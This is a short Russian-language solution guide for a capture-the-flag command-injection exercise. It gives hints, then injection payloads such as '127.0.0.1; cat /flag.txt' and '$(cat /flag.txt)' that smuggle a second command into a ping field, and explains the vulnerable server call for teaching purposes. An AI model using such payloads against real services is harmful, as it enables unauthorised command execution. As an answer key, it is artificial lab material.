## Подсказки

1. Что происходит с вашим вводом?
2. Как можно выполнить две команды в одной строке?
3. Попробуйте: `; ls` или `&& ls`

## Способ решения

1. Ввести в поле: `127.0.0.1; cat /flag.txt`
2. Или: `127.0.0.1 && cat /flag.txt`
3. Или: `$(cat /flag.txt)`
4. Получить флаг!

### Как это работает

Сервер выполняет:
```bash
ping -c 1 <user_input>
```

С инъекцией:
```bash
ping -c 1 127.0.0.1; cat /flag.txt
```

Точка с запятой позволяет выполнить вторую команду.

Показать опасность передачи пользовательского ввода в системные команды.
Объяснить принцип Command Injection и способы защиты.
